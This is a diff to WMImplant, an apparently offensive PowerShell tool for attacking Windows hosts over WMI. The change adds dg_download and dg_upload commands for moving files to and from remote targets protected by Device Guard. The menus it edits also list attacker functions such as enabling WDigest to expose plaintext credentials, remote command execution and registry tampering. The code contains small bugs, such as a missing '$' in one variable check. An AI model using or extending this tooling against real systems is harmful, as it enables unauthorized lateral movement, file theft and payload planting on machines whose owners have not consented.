@@ -666,6 +666,47 @@ function Invoke-CommandGeneration
             }
         }
 
+        "dg_download"
+        {
+            # Determine which file you want to download, and where to save it
+            $GenDownload = Read-Host "What is the full path to the file you want to download? >"
+            $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"
+
+            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
+                $Command
+            }
+        }
+
+        "dg_upload"
+        {
+            $LocalUserUpload = Read-Host "Please provide the local user account for connecting back over WMI >"
+            $LocalUserUpload = $LocalUserUpload.Trim().ToLower()
+            $LocalPassUpload = Read-Host "Please provide the password associated with the account >"
+
+            $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
+            $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"
+
+            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command dg_upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command
+            }
+
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command dg_upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
+                $Command
+            }
+        }
+
         "download"
         {
             # Determine which file you want to download, and where to save it
@@ -2238,6 +2279,73 @@ function Invoke-WMImplant
                     }
                 }
 
+                "dg_download"
+                {
+                    if(!Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    if(!$RemoteFile)
+                    {
+                        Throw "You need to specify a file to read with the RemoteFile flag!"
+                    }
+
+                    if(!$LocalFile)
+                    {
+                        Throw "You need to specify the location to save the file with the $LocalFile flag!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-FileTransferWMImplantDG -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                        }
+
+                        else
+                        {
+                            Invoke-FileTransferWMImplantDG -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                        }
+                    }
+                }
+
+                "dg_upload"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    if(!$LocalUser -or !$LocalPass)
+                    {
+                        Throw "Please provide the LocalUser and LocalPass parameters to use for upload functionality!"
+                    }
+
+                    if(!$LocalFile)
+                    {
+                        Throw "Please use the LocalFile flag to specify the file to upload!"
+                    }
+
+                    if(!$RemoteFile)
+                    {
+                        Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-FileTransferWMImplantDG -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                        }
+
+                        else
+                        {
+                            Invoke-FileTransferWMImplantDG -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                        }
+                    }
+                }
+
                 "download"
                 {
                     if(!$Target)
@@ -3154,6 +3262,8 @@ function Show-WMImplantMainMenu
     $menu_options += "File Operations`n"
     $menu_options += "====================================================================`n"
     $menu_options += "cat - Attempt to read a file's contents`n"
+    $menu_options += "dg_download - Download a file from a device guard proteted system"`n
+    $menu_options += "dg_upload - Upload a file to a device guard protected system"`n
     $menu_options += "download - Download a file from a remote machine`n"
     $menu_options += "ls - File/Directory listing of a specific directory`n"
     $menu_options += "ninjacopy - Copy any file`n"
@@ -3164,9 +3274,9 @@ function Show-WMImplantMainMenu
     $menu_options += "====================================================================`n"
     $menu_options += "command_exec - Run a command line command and get the output`n"
     $menu_options += "disable_wdigest - Remove registry key UseLogonCredential`n"
-    $menu_options += "disable_winrm - Disable WinRM on the targeted host"`n
+    $menu_options += "disable_winrm - Disable WinRM on the targeted host`n"
     $menu_options += "enable_wdigest - Add registry key UseLogonCredential`n"
-    $menu_options += "enable_winrm - Enable WinRM on a targeted host"`n
+    $menu_options += "enable_winrm - Enable WinRM on a targeted host`n"
     $menu_options += "registry_mod - Modify the registry on the targeted system`n"
     $menu_options += "remote_posh - Run a PowerShell script on a system and receive output`n"
     $menu_options += "sched_job - Manipulate scheduled jobs`n"
@@ -3246,6 +3356,32 @@ function Use-MenuSelection
                 else
                 {
                     Get-FileContentsWMImplant
+                }
+            }
+
+            "dg_download"
+            {
+                if ($Credential)
+                {
+                    Invoke-FileTransferWMImplantDG -Creds $Credential -Download
+                }
+
+                else
+                {
+                    Invoke-FileTransferWMImplantDG -Download
+                }
+            }
+
+            "dg_upload"
+            {
+                if ($Credential)
+                {
+                    Invoke-FileTransferWMImplantDG -Creds $Credential -Upload
+                }
+
+                else
+                {
+                    Invoke-FileTransferWMImplantDG -Upload
                 }
             }
 
